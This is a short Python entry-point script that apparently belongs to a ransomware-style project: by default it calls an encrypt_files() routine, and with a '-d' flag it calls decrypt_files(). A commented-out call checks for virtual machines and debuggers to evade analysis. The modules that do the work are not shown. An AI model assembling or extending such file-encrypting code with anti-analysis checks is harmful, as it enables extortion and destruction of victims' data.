import sys
import antianalysis
import encrypt
import decrypt

def main():
    if len(sys.argv) > 1 and sys.argv[1] == "-d":
        decrypt.decrypt_files()
    else:
        #antianalysis.check_virtualization_and_debbuging() 
        encrypt.encrypt_files()

if __name__ == "__main__":
    main()